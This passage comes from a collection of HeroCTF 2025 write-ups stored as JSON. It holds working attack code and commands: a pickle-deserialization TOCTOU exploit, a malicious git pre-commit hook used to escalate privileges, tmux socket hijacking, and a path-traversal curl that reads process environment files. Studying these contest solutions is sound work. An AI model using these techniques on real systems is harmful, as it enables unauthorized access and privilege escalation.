HERO{D1D_Y0U_U53_0BJ3C71ON?}\n\n========================================\n\n</code></pre>\n<h3>Flag</h3>\n<pre><code class=\"\">\nHERO{D1D_Y0U_U53_0BJ3C71ON?}\n\n</code></pre>\n<p>[[HeroCTF 2025]]</p>"
            },
            {
                "id": "freeda-simple-hook",
                "title": "Freeda-Simple-Hook",
                "category": "Miscellaneous",
                "tags": [
                    "xor",
                    "reverse"
                ],
                "writeup": "<p>android</p>\n<h3>Challenge Overview</h3>\n<p>This challenge provides an Android application in which the flag is not stored directly, but instead generated at runtime via obfuscated Java code.</p>\n<p>Inside the APK, the critical logic is located in:</p>\n<p><code>com.heroctf.freeda1.utils.Vault</code></p>\n<p>The flag is computed by the method:</p>\n<p><code>get_flag()</code></p>\n<p>Our goal is to reverse this function and rebuild the flag.</p>\n<p>---</p>\n<h3>Step 1: Locate the Flag Generator</h3>\n<p>After decompiling the APK with jadx / JADX-GUI / JADX CLI, we find this class:</p>\n<pre><code class=\"java\">\nfinal class Vault {\n\n    public static final int[] a = {52, 88, 27, 32, ... 202, 66};\n\n\n\n    public static String get_flag() { ... }\n\n\n\n    private static int seed() { ... }\n\n}\n\n\n\n</code></pre>\n<p>The flag is not stored as a literal string.   Instead, an encrypted integer array is used and decoded at runtime.</p>\n<p>---</p>\n<h3>Step 2: Understand the Seed Generation</h3>\n<p>The <code>seed()</code> function creates a decryption key using hardcoded class names.</p>\n<pre><code class=\"java\">\nint iHashCode =\n\n        (\"com.heroctf.freeda1.MainActivity\".hashCode() ^ (-1056969150))\n\n      ^ \"com.heroctf.freeda1.utils.CheckFlag\".hashCode();\n\n\n\nreturn iHashCode ^ (Integer.rotateLeft(iHashCode, 7) * (-1640531527));\n\n\n\n</code></pre>\n<h4>Summary</h4>\n<p>The seed is based on:</p>\n<ul>\n<li>Two Java class names</li>\n</ul>\n<ul>\n<li>XOR operations</li>\n</ul>\n<ul>\n<li>Bit rotation</li>\n</ul>\n<ul>\n<li>Large magic constants</li>\n</ul>\n<p>This prevents simply copying the encrypted data without reproducing the logic.</p>\n<p>---</p>\n<h3>Step 3: Reconstruct the Shuffle</h3>\n<p>After generating the seed, an index array is created:</p>\n<p><code>[0, 1, 2, ..., 38]</code></p>\n<p>Then it is <strong>shuffled using a XORSHIFT PRNG algorithm</strong>:</p>\n<pre><code class=\"java\">\nint i2 = (-1515870811) ^ iSeed;\n\n\n\nfor (int i = 38; i &gt;= 0; i--) {\n\n    i2 = xorshift(i2);\n\n    int idx = i2 % (i + 1);\n\n    swap(iArr[i], iArr[idx]);\n\n}\n\n\n\n</code></pre>\n<p>This step randomizes the order in which encrypted bytes are accessed.</p>\n<p>The algorithm is deterministic:   \u2192 same seed = same order.</p>\n<p>---</p>\n<h3>Step 4: Decryption Logic</h3>\n<p>For each byte:</p>\n<pre><code class=\"java\">\nint val = a[iArr[i]] - i; \n\nval = ROTATE_RIGHT(val, shift); \n\nval ^= seed_fragment;\n\n</code></pre>\n<p>Where:</p>\n<ul>\n<li><code>shift = (seed &gt;&gt; 27) &amp; 7</code></li>\n</ul>\n<ul>\n<li><code>seed_fragment = seed shifted per byte</code></li>\n</ul>\n<ul>\n<li>rotation + xor produce decrypted output</li>\n</ul>\n<p>---</p>\n<h3>Step 5: Port Everything to Python</h3>\n<p>Instead of running the Android app, the logic can be reproduced externally.</p>\n<p>We reimplemented:</p>\n<ul>\n<li>Java string hashing</li>\n</ul>\n<ul>\n<li>Integer rotation</li>\n</ul>\n<ul>\n<li>XORSHIFT PRNG</li>\n</ul>\n<ul>\n<li>Byte transformations</li>\n</ul>\n<h4>Python Solver (Final)</h4>\n<pre><code class=\"python\">\na = [52,88,27,32,27,186,96,109,45,202,42,125,25,134,159,69,47,142,192,\n\n     184,13,19,139,173,59,129,0,158,165,188,13,62,74,184,58,75,172,202,66]\n\n\n\ndef jhash(s):\n\n    h = 0\n\n    for c in s:\n\n        h = (31*h + ord(c)) &amp; 0xffffffff\n\n    return h\n\n\n\ndef rol(x,n):\n\n    return ((x &lt;&lt; n) | (x &gt;&gt; (32-n))) &amp; 0xffffffff\n\n\n\nC1 = (-1056969150) &amp; 0xffffffff\n\nC2 = (-1515870811) &amp; 0xffffffff\n\nC3 = (-1640531527) &amp; 0xffffffff\n\n\n\nhc = (jhash(\"com.heroctf.freeda1.MainActivity\") ^ C1) ^ jhash(\"com.heroctf.freeda1.utils.CheckFlag\")\n\nseed = (hc ^ (rol(hc,7) * C3)) &amp; 0xffffffff\n\n\n\niArr = list(range(39))\n\ni2 = (C2 ^ seed) &amp; 0xffffffff\n\n\n\ndef xorshift(x):\n\n    x ^= (x &lt;&lt; 13) &amp; 0xffffffff\n\n    x ^= (x &gt;&gt; 17)\n\n    x ^= (x &lt;&lt; 5) &amp; 0xffffffff\n\n    return x &amp; 0xffffffff\n\n\n\nfor i in range(38,-1,-1):\n\n    i2 = xorshift(i2)\n\n    idx = i2 % (i+1)\n\n    iArr[i], iArr[idx] = iArr[idx], iArr[i]\n\n\n\nout = []\n\nfor i in range(39):\n\n    i8 = ((a[iArr[i]] &amp; 255) - i) &amp; 255\n\n    rot = (seed &gt;&gt; 27) &amp; 7\n\n    val = ((i8 &lt;&lt; (8-rot)) | (i8 &gt;&gt; rot)) &amp; 255\n\n    val ^= (seed &gt;&gt; ((i &amp; 3)*8)) &amp; 255\n\n    out.append(val)\n\n\n\nprint(bytes(out).decode(\"latin1\"))\n\n\n\n</code></pre>\n<p>---</p>\n<h3>Step 6: Final Result</h3>\n<p>Running the script outputs:</p>\n<p><code>Hero{1_H0P3_Y0U_D1DN'T_S7A71C_4N4LYZ3D}</code></p>\n<p>[[HeroCTF 2025]]</p>"
            },
            {
                "id": "lsd4",
                "title": "LSD4",
                "category": "Miscellaneous",
                "tags": [
                    "rop",
                    "steg",
                    "image"
                ],
                "writeup": "<h4>1. Analysis</h4>\n<p>The file provided is named <code>secret.jpg</code>. However, running the <code>file</code> command or checking the headers reveals it is actually a <strong>PNG image</strong>. This is crucial because PNG is a lossless format, meaning pixel values (and their Least Significant Bits) are preserved, unlike in JPEG.</p>\n<p>The description explicitly mentions a specific Region of Interest (ROI):</p>\n<ul>\n<li><strong>Start:</strong> (1000, 1000)</li>\n</ul>\n<ul>\n<li><strong>Size:</strong> 100x100 pixels</li>\n</ul>\n<p>The Title \"LSD\" is a reference to <strong>Least Significant Digit</strong> (or Bit) steganography. Since automated tools like <code>zsteg</code> analyze the whole image (which is full of psychedelic noise), they fail. We must write a script to target the specific ROI.</p>\n<h4>2. Methodology</h4>\n<ol>\n<li><strong>Crop the Image:</strong> Isolate the 100x100 square at (1000, 1000).</li>\n</ol>\n<ol>\n<li><strong>LSB Extraction:</strong> Extract the Least Significant Bit (Bit 0) from the pixels in this region.</li>\n</ol>\n<ol>\n<li><strong>Channel Isolation:</strong> Initially, reading bits from all channels (RGB) returned garbage data. By iterating through channels individually (Red, Green, Blue, Alpha), we discovered the message was hidden exclusively in the <strong>Red Channel</strong>.</li>\n</ol>\n<h4>3. Solver Script</h4>\n<p>Here is the Python script used to solve the challenge:</p>\n<p>Python</p>\n<pre><code class=\"\">\nfrom PIL import Image\n\n\n\ndef solve():\n\n    # Load the image (PIL handles the fake .jpg extension automatically)\n\n    img = Image.open(\"secret.jpg\").convert(\"RGBA\")\n\n    \n\n    # Crop the Region of Interest specified in the description\n\n    # Box = (left, upper, right, lower)\n\n    roi = img.crop((1000, 1000, 1100, 1100))\n\n    pixels = list(roi.getdata())\n\n    \n\n    print(\"[+] Extracting LSB from Red Channel...\")\n\n\n\n    # Extract LSB from the Red Channel only (Index 0)\n\n    bits = [pixel[0] &amp; 1 for pixel in pixels]\n\n\n\n    # Convert bits to characters\n\n    chars = []\n\n    for i in range(0, len(bits), 8):\n\n        byte_bits = bits[i:i+8]\n\n        if len(byte_bits) == 8:\n\n            # Join bits and convert to int, then to char\n\n            byte_val = int(\"\".join(map(str, byte_bits)), 2)\n\n            chars.append(chr(byte_val))\n\n\n\n    full_message = \"\".join(chars)\n\n    \n\n    # Locate and print the flag\n\n    if \"Hero{\" in full_message:\n\n        start = full_message.find(\"Hero{\")\n\n        end = full_message.find(\"}\", start) + 1\n\n        print(f\"\\n\ud83d\udea9 FLAG: {full_message[start:end]}\")\n\n    else:\n\n        print(\"Flag pattern not found in Red channel. Check output:\\n\")\n\n        print(full_message[:100])\n\n\n\nif __name__ == \"__main__\":\n\n    solve()\n\n</code></pre>\n<h4>4. Output & Flag</h4>\n<p>Running the script produces a long string of text regarding the definition of Steganography, with the flag embedded inside.</p>\n<p><strong>Output:</strong></p>\n<p>Plaintext</p>\n<pre><code class=\"\">\nSteganography is the practice of concealing information... Hero{M4YB3_TH3_L4ST_LSB?} ...\n\n</code></pre>\n<p><strong>Flag:</strong></p>\n<pre><code class=\"\">\nHero{M4YB3_TH3_L4ST_LSB?}\n\n</code></pre>\n<p>[[HeroCTF 2025]]</p>"
            },
            {
                "id": "movie-night-1",
                "title": "Movie Night 1",
                "category": "Miscellaneous",
                "tags": [
                    "rop"
                ],
                "writeup": "<p>system</p>\n<h3>1. Challenge Description & Clue</h3>\n<p>We are given SSH credentials (<code>user:password</code>) and a movie quote from _Alien (1979)_:</p>\n<p>> \"Something has <strong>attached</strong> itself to him. We have to get him to the infirmary right away.\"</p>\n<h3>2. Initial Reconnaissance</h3>\n<p>After connecting via SSH, we checked standard privilege escalation vectors.</p>\n<h4>Checking Sudo Privileges</h4>\n<p>We ran <code>sudo -l</code> to check for allowed commands.</p>\n<p>Bash</p>\n<pre><code class=\"\">\nsudo -l\n\n# Output:\n\n# (user) NOPASSWD: ALL\n\n</code></pre>\n<p><strong>Analysis:</strong> This is a rabbit hole. The configuration allows the user <code>user</code> to run commands as <code>user</code> without a password. It does <strong>not</strong> grant root access or access to other users.</p>\n<h4>Analyzing the Clue</h4>\n<p>The challenge description emphasizes the word \"attached\" and the movie _Alien_.</p>\n<ul>\n<li><strong>Alien:</strong> Could refer to the <code>alien</code> package converter tool.</li>\n</ul>\n<ul>\n<li><strong>Attached:</strong> Could refer to attaching to processes (gdb) or terminal sessions (tmux/screen).</li>\n</ul>\n<p>We searched for the <code>alien</code> binary but found nothing. We then checked running processes to see if anything was \"attached\" to the target user (<code>dev</code>).</p>\n<h3>3. Enumeration & Discovery</h3>\n<p>We listed all processes, filtering out kernel threads to reduce noise.</p>\n<p>Bash</p>\n<pre><code class=\"\">\nps aux | grep -v \"\\[\"\n\n</code></pre>\n<p><strong>Result:</strong></p>\n<p>Plaintext</p>\n<pre><code class=\"\">\ndev   31  0.0  0.0   4548  3260 ?   Ss   10:47   0:00 tmux -S /tmp/tmux-1002 new-session -d -s work bash\n\n</code></pre>\n<p><strong>Vulnerability Identified:</strong> The user <code>dev</code> is running a <strong>tmux</strong> session named <code>work</code>. Crucially, it is using a custom socket located at <code>/tmp/tmux-1002</code>.</p>\n<p>We checked the permissions of this socket:</p>\n<p>Bash</p>\n<pre><code class=\"\">\nls -l /tmp/tmux-1002\n\n# srw-rw-rw- 1 dev dev 0 Nov 29 10:47 /tmp/tmux-1002\n\n</code></pre>\n<p>The socket is <strong>world-writable (<code>rw-rw-rw-</code>)</strong>. This means any user on the system can interact with this socket and \"attach\" to the session.</p>\n<h3>4. Exploitation</h3>\n<p>We attempted to attach to the session using the <code>-S</code> flag to specify the socket and <code>-t</code> to specify the session name.</p>\n<h4>The Attack Command</h4>\n<p>Bash</p>\n<pre><code class=\"\">\ntmux -S /tmp/tmux-1002 attach -t work\n\n</code></pre>\n<h4>The \"Terminal Type\" Error</h4>\n<p>Upon running the exploit, we encountered an error: <code>open terminal failed: missing or unsuitable terminal: xterm-ghostty</code></p>\n<p>This occurred because the remote server did not recognize the local terminal emulator (Ghostty). We bypassed this by overriding the <code>TERM</code> environment variable to a standard value (<code>xterm</code>).</p>\n<h4>Final Payload</h4>\n<p>Bash</p>\n<pre><code class=\"\">\nTERM=xterm tmux -S /tmp/tmux-1002 attach -t work\n\n</code></pre>\n<h3>5. Flag Capture</h3>\n<p>The command succeeded, and we were dropped into the <code>dev</code> user's active session.</p>\n<p>Bash</p>\n<pre><code class=\"\">\nwhoami\n\n# dev\n\n\n\ncat /home/dev/flag.txt\n\n</code></pre>\n<p><strong>Flag:</strong> <code>Hero{1s_1t_tmux_0r_4l13n?_a20bac4b5aa32e8d9a8ccb75d228ca3e}</code></p>\n<p>[[HeroCTF 2025]]</p>"
            },
            {
                "id": "movie-night-2",
                "title": "Movie Night 2",
                "category": "Miscellaneous",
                "tags": [
                    "pwn"
                ],
                "writeup": "<p>system</p>\n<h3>1. Reconnaissance</h3>\n<p>Starting as the user <code>dev</code> (obtained in the previous challenge), we investigated running processes and found a Python service running as <strong>root</strong>:</p>\n<p>Bash</p>\n<pre><code class=\"\">\nroot  19 ... /usr/bin/python3 /opt/procservice/procedure-processing-service.py\n\n</code></pre>\n<p>We located the source code in <code>~/procservice_src/</code>. Analyzing <code>procedure-processing-service.py</code> and <code>lib/utils.py</code> revealed it was a <strong>D-Bus Service</strong> that allows users to \"Register\" and \"Execute\" Python code (via Pickle serialization).</p>\n<h3>2. Vulnerability Analysis</h3>\n<p>The application had two distinct vulnerabilities that, when chained, allowed for Privilege Escalation.</p>\n<h4>A. Insecure Deserialization</h4>\n<p>The service used <code>pickle</code> to handle user input. The <code>ExecuteProcedure</code> method called <code>unpickle_file()</code>:</p>\n<p>Python</p>\n<pre><code class=\"\">\n# From procedure-processing-service.py\n\nobj_repr, error = unpickle_file(filepath) # &lt;--- Vulnerability 1\n\n# ...\n\nfile_stat = os.stat(filepath)             # &lt;--- Owner Check\n\nfile_owner_uid = file_stat.st_uid\n\n# ...\n\nresult = execute_as_user(obj_repr, file_owner_uid)\n\n</code></pre>\n<p>In Python, <code>unpickle_file()</code> executes code immediately (via <code>__reduce__</code>) _before_ the service checks who owns the file or what the code does.</p>\n<h4>B. TOCTOU (Time-of-Check to Time-of-Use)</h4>\n<p>The service attempted to enforce security by checking the file owner (<code>os.stat</code>) and then executing the code _as that user_ (<code>execute_as_user</code>).</p>\n<p>However, there is a gap between <strong>Unpickling</strong> (Step 1) and <strong>Checking Ownership</strong> (Step 2).</p>\n<ul>\n<li><strong>Step 1:</strong> The service unpickles our file. We can run code here as <code>dbus-service</code>.</li>\n</ul>\n<ul>\n<li><strong>Step 2:</strong> The service checks <code>os.stat(filepath)</code>.</li>\n</ul>\n<ul>\n<li><strong>Step 3:</strong> The service executes the return string as the file owner.</li>\n</ul>\n<p><strong>The Exploit Path:</strong> We can use the code execution in Step 1 to <strong>delete our own pickle file</strong> and replace it with a <strong>symlink to the flag</strong>. When Step 2 happens, the service will follow the symlink, see that the flag is owned by <strong>Admin</strong>, and then execute our payload with Admin privileges.</p>\n<h3>3. The Exploit Strategy</h3>\n<p>We crafted a Python script to interact with the D-Bus.</p>\n<ol>\n<li><strong>The Payload:</strong> A Python <code>__reduce__</code> method that:</li>\n</ol>\n<ul>\n<li>Iterates through files in <code>/var/procedures</code>.</li>\n</ul>\n<ul>\n<li>Finds the pickle file currently being processed.</li>\n</ul>\n<ul>\n<li><strong>Deletes it.</strong></li>\n</ul>\n<ul>\n<li><strong>Symlinks it</strong> to <code>/home/admin/flag.txt</code>.</li>\n</ul>\n<ul>\n<li>Returns a string: <code>'print(open(\"/home/admin/flag.txt\").read())'</code>.</li>\n</ul>\n<ol>\n<li><strong>The Trigger:</strong></li>\n</ol>\n<ul>\n<li>Register the procedure (creates the file as <code>dev</code>).</li>\n</ul>\n<ul>\n<li>Execute the procedure (triggers the unpickle -> swap -> execute as admin).</li>\n</ul>\n<h3>4. The Exploit Code</h3>\n<p>Due to Python syntax restrictions inside <code>eval()</code>, we used a tuple expression and <code>__import__</code> to keep the payload clean.</p>\n<p>Python</p>\n<pre><code class=\"\">\nimport dbus\n\nimport pickle\n\nimport base64\n\n\n\n# CONFIG\n\nPROC_NAME = \"pwn_admin\"\n\nTARGET_FLAG = \"/home/admin/flag.txt\"\n\nGLOB_PATTERN = f\"/var/procedures/*_{PROC_NAME}.pkl\"\n\n\n\nclass SwapAttack(object):\n\n    def __reduce__(self):\n\n        # The Trap: Runs as dbus-service immediately upon unpickling\n\n        # 1. Finds the pickle file.\n\n        # 2. Deletes it.\n\n        # 3. Symlinks it to the target Admin file.\n\n        # 4. Returns the payload string to be executed as Admin.\n\n        \n\n        expr = f\"\"\"\n\n(\n\n    [\n\n        (\n\n            __import__('os').remove(p),\n\n            __import__('os').symlink('{TARGET_FLAG}', p)\n\n        ) \n\n        for p in __import__('glob').glob('{GLOB_PATTERN}')\n\n    ],\n\n    'print(open(\"{TARGET_FLAG}\").read())'\n\n)[1]\n\n\"\"\"\n\n        return (eval, (expr,))\n\n\n\n# 1. Generate Payload\n\npayload_obj = SwapAttack()\n\nserialized = pickle.dumps(payload_obj)\n\npayload_b64 = base64.b64encode(serialized).decode('utf-8')\n\n\n\n# 2. Connect to DBus\n\nbus = dbus.SystemBus()\n\nproxy = bus.get_object('com.system.ProcedureService', '/com/system/ProcedureService')\n\ninterface = dbus.Interface(proxy, 'com.system.ProcedureService')\n\n\n\n# 3. Register &amp; Trigger\n\ntry:\n\n    interface.RegisterProcedure(PROC_NAME, payload_b64)\n\nexcept Exception:\n\n    pass\n\n\n\ntry:\n\n    print(interface.ExecuteProcedure(PROC_NAME))\n\nexcept Exception as e:\n\n    print(e)\n\n</code></pre>\n<h3>5. Result</h3>\n<p>Running the exploit successfully bypassed the <code>systemd</code> sandboxing (which prevented writing to <code>/tmp</code> or <code>/home</code>) by tricking the service into reading the flag itself and returning the content via the D-Bus response.</p>\n<p>Bash</p>\n<pre><code class=\"\">\npython3 exploit_toctou.py\n\n</code></pre>\n<p><strong>Flag:</strong> <code>Hero{d0ubl3_rc3_ftw_ad57172613c7d5403a671fd7878a659d}</code></p>\n<p>[[HeroCTF 2025]]</p>"
            },
            {
                "id": "neverland",
                "title": "Neverland",
                "category": "Miscellaneous",
                "tags": [
                    "pwn"
                ],
                "writeup": "<h3>1. Initial Access</h3>\n<p>We started with the provided SSH credentials:</p>\n<ul>\n<li><strong>User:</strong> <code>intern</code></li>\n</ul>\n<ul>\n<li><strong>Password:</strong> <code>fairy</code></li>\n</ul>\n<p>Bash</p>\n<pre><code class=\"\">\nssh intern@&lt;TARGET_IP&gt;\n\n</code></pre>\n<h3>2. Enumeration</h3>\n<p>Upon logging in, standard enumeration revealed our escalation vector. Checking <code>sudo</code> privileges is always the first step:</p>\n<p>Bash</p>\n<pre><code class=\"\">\nintern@neverland:~$ sudo -l\n\nUser intern may run the following commands on neverland:\n\n    (peter) /opt/commit.sh\n\n</code></pre>\n<p>We found we could execute <code>/opt/commit.sh</code> as the user <strong>peter</strong> without a password.</p>\n<h3>3. Vulnerability Analysis</h3>\n<p>We analyzed the source code of the script: <code>cat /opt/commit.sh</code>.</p>\n<p><strong>The Workflow:</strong></p>\n<ol>\n<li>The script takes a <code>.tar.gz</code> archive as input.</li>\n</ol>\n<ol>\n<li>It extracts the archive to a temporary directory.</li>\n</ol>\n<ol>\n<li><strong>Security Check 1:</strong> It compares the <code>git log</code> history of the submitted repo against the official <code>/app</code> repo.</li>\n</ol>\n<ol>\n<li><strong>Security Check 2:</strong> It compares the hash of <code>.git/config</code> against the official repo to prevent config tampering.</li>\n</ol>\n<ol>\n<li><strong>The Trigger:</strong> If checks pass, it runs <code>git add .</code> followed by <code>git commit</code>.</li>\n</ol>\n<p><strong>The Flaw:</strong> While the script validates the history and the config file, <strong>it does not validate the <code>.git/hooks/</code> directory.</strong></p>\n<p>In Git, hooks are scripts that run automatically before or after Git events. Specifically, a <strong><code>pre-commit</code></strong> hook runs the moment <code>git commit</code> is executed. Since the script runs <code>git commit</code> as user <strong>peter</strong>, any code inside the <code>pre-commit</code> hook will also execute as <strong>peter</strong>.</p>\n<h3>4. Exploitation</h3>\n<p>We devised a \"Supply Chain\" attack by creating a repository that looks legitimate but contains a malicious hook.</p>\n<h4>Step 1: Clone the Valid State</h4>\n<p>To bypass the security checks, we started by copying the valid repository.</p>\n<p>Bash</p>\n<pre><code class=\"\">\ncp -r /app /tmp/exploit\n\ncd /tmp/exploit\n\n</code></pre>\n<h4>Step 2: Inject the Malicious Hook</h4>\n<p>We created a <code>pre-commit</code> script. Since we can't see the output of the hook easily, we directed it to read the flag and write it to a world-readable file in <code>/tmp</code>.</p>\n<p>Bash</p>\n<pre><code class=\"\">\n# Create the hook\n\necho '#!/bin/bash' &gt; .git/hooks/pre-commit\n\necho 'cat /home/peter/flag.txt &gt; /tmp/flag_pwned' &gt;&gt; .git/hooks/pre-commit\n\necho 'chmod 777 /tmp/flag_pwned' &gt;&gt; .git/hooks/pre-commit\n\n\n\n# IMPORTANT: Make it executable\n\nchmod +x .git/hooks/pre-commit\n\n</code></pre>\n<h4>Step 3: Force a Commit</h4>\n<p>Git hooks only fire if a commit actually happens. If there are no changes, <code>git commit</code> exits early. We created a dummy file to force a state change.</p>\n<p>Bash</p>\n<pre><code class=\"\">\necho \"trigger\" &gt; update.txt\n\n</code></pre>\n<h4>Step 4: Package and Execute</h4>\n<p>We packaged the malicious repository and fed it to the vulnerable script using <code>sudo</code>.</p>\n<p>Bash</p>\n<pre><code class=\"\">\ncd /tmp\n\ntar -czf payload.tar.gz exploit\n\nsudo -u peter /opt/commit.sh /tmp/payload.tar.gz\n\n</code></pre>\n<p>The script output confirmed <code>Changes successfully committed</code>, indicating our hook fired.</p>\n<h3>5. Loot</h3>\n<p>We checked the temporary file created by our payload:</p>\n<p>Bash</p>\n<pre><code class=\"\">\ncat /tmp/flag_pwned\n\n</code></pre>\n<p><strong>Flag:</strong> <code>Hero{c4r3full_w1th_g1t_hO0k5_d4dcefb250aa8c2ffabaa57119e3bc42}</code></p>\n<p>[[HeroCTF 2025]]</p>"
            },
            {
                "id": "paf-traversal",
                "title": "Paf Traversal",
                "category": "Binary Exploitation",
                "tags": [
                    "rsa",
                    "web",
                    "http",
                    "pwn",
                    "binary analysis",
                    "crack"
                ],
                "writeup": "<h3>1. Initial Reconnaissance</h3>\n<p>The challenge presented a set of files including a <code>cracker</code> directory (with <code>main.c</code> and <code>Makefile</code>) and an <code>api</code> directory (with Go files). The initial assumption was a local pwnable binary.</p>\n<ul>\n<li><code>cracker/main.c</code>: Contained the C code for a hash cracking service.</li>\n<li><code>api/</code>: Contained Go source code for a web API.</li>\n</ul>\n<h3>2. <code>cracker</code> Binary Analysis</h3>\n<p>Analysis of <code>cracker/main.c</code> revealed a program that communicates via named pipes (<code>/tmp/cracker.in</code> and <code>/tmp/cracker.out</code>). It accepts three lines of input:</p>\n<ol>\n<li><code>&lt;algo_type&gt;</code>: Hashing algorithm (MD5, SHA1, SHA256).</li>\n<li><code>&lt;hash_hex&gt;</code>: Target hash.</li>\n<li><code>&lt;wordlist_path&gt;</code>: Path to a wordlist file.</li>\n</ol>\n<p>The program then reads lines from <code>wordlist_path</code>, hashes them, and compares them to the target hash. A critical vulnerability was identified: the <code>wordlist_path</code> parameter was directly used in <code>fopen(wordlist_str, \"r\")</code> without sanitization, indicating a <strong>path traversal vulnerability</strong>.</p>\n<p>The <code>Makefile</code> showed compilation with debug symbols (<code>-g</code>) and no optimizations (<code>-O0</code>).</p>\n<h3>3. Web Interface Discovery</h3>\n<p>Initial attempts to interact with the local <code>cracker</code> binary directly proved difficult due to the interactive nature of the FIFO communication and the agent's limitations with concurrent shell commands. The user's prompt <code>http://dyn12.heroctf.fr:10259/</code> clarified that this was a remote web-based challenge.</p>\n<p>Accessing the URL via <code>curl http://dyn12.heroctf.fr:10259/</code> revealed a \"Wordlist & Bruteforce Dashboard\" web interface. This suggested that the <code>api</code> Go application was serving this interface and likely interacting with the <code>cracker</code> binary in the background.</p>\n<h3>4. <code>app.js</code> Analysis</h3>\n<p>To understand the web application's interaction with the backend, <code>app.js</code> was retrieved: <code>curl http://dyn12.heroctf.fr:10259/assets/app.js</code>.</p>\n<p>The <code>app.js</code> file revealed key API endpoints:</p>\n<ul>\n<li><code>/api/wordlist</code> (GET): List wordlists.</li>\n<li><code>/api/wordlist</code> (POST): Upload wordlist.</li>\n<li><code>/api/wordlist</code> (DELETE): Delete wordlist.</li>\n<li><code>/api/wordlist/download</code> (POST): <strong>Download wordlist content.</strong> This endpoint was particularly interesting.</li>\n<li><code>/api/bruteforce</code> (POST): Start a bruteforce job.</li>\n</ul>\n<h3>5. Path Traversal in <code>HandleDownloadWordlist</code></h3>\n<p>Further investigation focused on <code>api/controllers/wordlist_controller.go</code>. The <code>HandleDownloadWordlist</code> function was found to handle the <code>/api/wordlist/download</code> endpoint.</p>\n<p>The relevant code snippet:</p>\n<pre><code class=\"go\">\nfunc HandleDownloadWordlist(c *gin.Context) {\n\n    wordlistDir := getWordlistDir() // e.g., /app/api/wordlists/\n\n    json := DownloadRequest{}\n\n    if err := c.ShouldBindJSON(&amp;json); err != nil { /* ... */ }\n\n\n\n    filePath := filepath.Join(wordlistDir, json.Filename) // Vulnerable line!\n\n    f, err := os.Open(filePath) // Error originates here\n\n    if err != nil { /* ... */ }\n\n    defer f.Close()\n\n\n\n    data, err := io.ReadAll(f)\n\n    if err != nil { /* ... */ }\n\n\n\n    c.JSON(http.StatusOK, gin.H{ \"filename\": fileName, \"content\": string(data), })\n\n}\n\n</code></pre>\n<p>Crucially, <code>filePath</code> was constructed using <code>filepath.Join(wordlistDir, json.Filename)</code>. While <code>filepath.Join</code> normally handles absolute paths correctly (if <code>json.Filename</code> were <code>/flag.txt</code>, <code>filePath</code> should become <code>/flag.txt</code>), initial attempts with <code>{\"filename\": \"/flag.txt\"}</code> resulted in <code>{\"error\":\"open /app/api/wordlists/flag.txt: no such file or directory\"}</code>. This indicated that <code>json.Filename</code> was being treated as a relative path, or the <code>wordlistDir</code> was being prepended despite the absolute path.</p>\n<p>However, using path traversal techniques like <code>../</code> proved successful. A request with <code>{\"filename\": \"../../../../flag.txt\"}</code> resulted in <code>{\"error\":\"open /flag.txt: no such file or directory\"}</code>, confirming that we could reach the root directory (<code>/</code>).</p>\n<h3>6. Path Traversal in <code>HandleBruteforce</code> (and why it wasn't vulnerable)</h3>\n<p>Analysis of <code>api/controllers/bruteforce_controller.go</code> showed that the <code>StartBruteforce</code> function handled the <code>/api/bruteforce</code> endpoint. While the <code>cracker</code> binary itself was vulnerable to path traversal through <code>wordlist_str</code>, the Go API sanitized the <code>wordlist</code> parameter before passing it to the <code>cracker</code>.</p>\n<pre><code class=\"go\">\nfilePath := filepath.Join(wordlistDir, path.Base(json.Wordlist)) // `path.Base` strips traversal!\n\nresp, err := requestAndWait(json.Algorithm, json.Hash, filePath, DEFAULT_TIMEOUT)\n\n</code></pre>\n<p>The <code>path.Base()</code> call effectively removed any <code>../</code> sequences, making this endpoint not vulnerable to path traversal.</p>\n<h3>7. Flag Location Discovery (<code>entrypoint.sh</code>)</h3>\n<p>With confirmed path traversal via <code>/api/wordlist/download</code>, the next step was to find the flag. Common CTF flag locations (<code>/flag.txt</code>, <code>/etc/flag</code>, <code>/app/flag.txt</code>, <code>/var/www/html/flag.txt</code>) were attempted but returned \"no such file or directory\".</p>\n<p>Attempting to read <code>/.dockerenv</code> using <code>{\"filename\": \"../../../.dockerenv\"}</code> returned empty content but confirmed that arbitrary file reading from the root was possible.</p>\n<p>The <code>entrypoint.sh</code> script is often a good place to look for flag setup in Docker containers. Reading <code>/entrypoint.sh</code> via <code>{\"filename\": \"../../../entrypoint.sh\"}</code> yielded:</p>\n<pre><code class=\"bash\">\n#!/bin/bash\n\n\n\necho \"${FLAG:-HEROCTF_FAKE_FLAG}\" &gt; \"/app/flag_$(openssl rand -hex 8).txt\"\n\nchmod 444 /app/flag_*.txt\n\nunset FLAG\n\n\n\n/app/cracker/cracker &amp;\n\ncd /app/api/ &amp;&amp; ./api\n\n</code></pre>\n<p>This script revealed:</p>\n<ul>\n<li>The flag is written to <code>/app/flag_RANDOMHEX.txt</code>, where <code>RANDOMHEX</code> is a random 8-byte hexadecimal string generated by <code>openssl rand -hex 8</code>.</li>\n<li>The <code>FLAG</code> environment variable is <code>unset</code> *after* the file is created.</li>\n</ul>\n<p>This meant the flag filename was dynamic and unpredictable.</p>\n<h3>8. Finding the Random Flag</h3>\n<p>Since the flag filename was random and directory listing was not possible via the <code>download</code> endpoint, a new approach was needed. The <code>entrypoint.sh</code> script set the <code>FLAG</code> environment variable *before* writing it to the file and then unsetting it.</p>\n<p>In Docker containers, the process with PID 1 is typically the <code>entrypoint.sh</code> script or its direct parent. The environment variables of a process can often be read from <code>/proc/&lt;pid&gt;/environ</code>.</p>\n<p>Therefore, the strategy was to read the environment variables of PID 1, hoping to find the <code>FLAG</code> before it was unset.</p>\n<p>Requesting <code>{\"filename\": \"../../../proc/1/environ\"}</code> via the <code>/api/wordlist/download</code> endpoint:</p>\n<pre><code class=\"bash\">\ncurl -X POST -H \"Content-Type: application/json\" -d '{\"filename\": \"../../../proc/1/environ\"}' http://dyn12.heroctf.fr:10259/api/wordlist/download\n\n</code></pre>\n<h3>9. Final Flag Retrieval</h3>\n<p>The response to the <code>/proc/1/environ</code> request contained the following:</p>\n<pre><code class=\"json\">\n{\"content\":\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\\u0000HOSTNAME=paf_traversal\\u0000FLAG=Hero{e9e2b63a0daa9ee41d2133b450425b2cd7c7510e5a28b\n\n655748456bd3f6e5c2a}\\u0000DEPLOY_HOST=dyn12.heroctf.fr\\u0000DEPLOY_PORTS=8000/tcp-\\u003e10259\\u0000HOME=/app/\\u0000\",\"filename\":\"environ\"}\n\n</code></pre>\n<p>The <code>FLAG</code> environment variable was successfully 